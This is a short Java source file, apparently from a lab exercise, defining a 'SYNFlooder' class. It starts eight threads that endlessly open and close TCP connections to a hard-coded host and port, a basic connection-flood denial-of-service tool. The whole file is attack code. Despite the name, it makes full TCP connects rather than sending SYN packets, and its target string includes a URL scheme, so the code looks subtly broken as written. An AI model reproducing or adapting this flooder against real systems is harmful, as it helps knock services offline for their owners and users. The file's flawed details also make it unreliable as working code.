package FOIS_LAB;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.UnknownHostException;

public class SYNFlooder extends Thread {
    private String url;
    private int port;

    SYNFlooder(String url, int port){
        this.url = url;
        this.port= port;
    }
    public void run() {
        while(true){
            try{
                Socket socket = new Socket();
                socket.connect(new InetSocketAddress(url, port), 10000);
                System.out.println("Connection Status: "+socket.isConnected());
                System.out.println(this + "==" + socket.getInetAddress());
                Thread.sleep(50);
                socket.close();
            }catch (UnknownHostException e){
                System.out.println("Unknown Host Exception");
            }catch (IOException e){
                System.out.println("IO Exception");
            }catch (InterruptedException e){
                System.out.println("Interrupted Exception");
            }
        }

    }
    public static void main (String[] args){
        for (int i = 0; i < 8; i++) {
            SYNFlooder syn = new SYNFlooder("http://0.0.0.0", 5000);
            syn.start();
        }
    }
}
